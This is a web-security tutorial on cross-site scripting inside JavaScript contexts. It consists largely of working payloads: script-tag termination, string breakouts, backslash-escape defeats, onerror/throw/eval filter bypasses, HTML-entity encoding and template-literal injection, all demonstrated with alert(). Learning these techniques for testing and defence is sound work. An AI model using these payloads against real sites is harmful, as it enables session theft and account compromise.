# XSS into JavaScript

## 1. Terminating the existing script

Simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript:

```
<script>
...
var input = 'controllable data here';
...
</script>
```

Then do:
`</script><img src=1 onerror=alert(document.domain)>`

**Note:** This technique works because browsers separate HTML parsing from JavaScript execution. The payload breaks the original script with an unterminated string, but the browser still parses and executes the injected code normally.

## 2. Breaking out of a JavaScript string

When XSS occurs within a quoted string, you can break out of the string to execute JavaScript. Ensure you repair the script afterward, as syntax errors will prevent execution.
Some useful ways of breaking out of a string literal are:

```
'-alert(document.domain)-'
';alert(document.domain)//
```

Some applications try to prevent JavaScript string breakouts by escaping quote characters with backslashes. However, they often fail to escape the backslash itself, allowing attackers to neutralize the application's protective backslashes with their own.

For example, suppose that the input:
```
';alert(document.domain)//
gets converted to:

\';alert(document.domain)//
You can now use the alternative payload:

\';alert(document.domain)//
which gets converted to:

\\';alert(document.domain)//
```
Here, the first backslash causes the second backslash to be interpreted literally, not as an escape character. This leaves the quote unescaped, allowing it to terminate the string and execute the attack.

Some websites **restrict characters to prevent XSS**, either directly or via WAFs. To bypass these measures, we can try the following mechanisms:

### 1 - The onerror/throw Method:

This technique leverages JavaScript's exception handling mechanism, specifically the global onerror event handler combined with the throw statement. This approach functions by:
- Assigning the target function to `onerror`
- Then, use `throw` to create an exception that passes arguments to the handler

```
javascript

onerror=alert;throw 1337
```

### 2 - Block Statement Method:

Encapsulating the `onerror` assignment within curly braces to eliminate the need for semicolons: `{onerror=alert}throw 1337`

### 3 - Expression-Based Invocation:

Embedding the `onerror` assignment within the throw expression itself: `throw onerror=alert,'some string',123,'haha'`

(The comma operator evaluates multiple expressions from left to right, but only returns the value of the last expression.)

### 4 - String Evaluation:

Using `eval` as the exception handler enables arbitrary code execution via carefully crafted exception messages: `{onerror=eval}throw'=alert\x281337\x29'`

**Note:**
> - `\x28` is **hex** for `(` and `\x29` is **hex** for `)`
> - This method only work on chrome because its prefixes syntactically valid in Chrome 

### 5 - String Evaluation (but for firefox)

Emulating the `Error` object structure to avoid problematic prefixing in Firefox: 

`{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}`

### 6 - Without throw method:

Using regular expressions and string manipulation to construct callable expressions. Then, Exploiting type errors to trigger function execution:

`TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']`

## 3. Making use of HTML-encoding

When exploiting XSS in JavaScript within quoted tag attributes (like event handlers), HTML-encoding can bypass input filters.

After parsing HTML, browsers decode attribute values before processing them. This allows you to HTML-encode characters that might be blocked by server-side validation.

**Example:** 
If your XSS context is:
`<a href="#" onclick="... var input='controllable data here'; ...">`

And single quotes are blocked/escaped, use:
`&apos;-alert(document.domain)-&apos;`

The browser decodes `&apos;` to single quotes before JavaScript execution, breaking out of the string context to run your code. (you can also use `&#39;`)

## 4. XSS in JavaScript Template Literals

JavaScript template literals (enclosed in backticks) allow embedded expressions using `${...}` syntax that are evaluated during processing.

When exploiting XSS in a template literal context, you don't need to terminate the string - simply inject a JavaScript expression:

**Example:**
If your XSS context is:
`<script> ... var input = controllable data here; ... </script>`

Use this payload:
`${alert(document.domain)}`

The expression will execute when the template literal is processed.
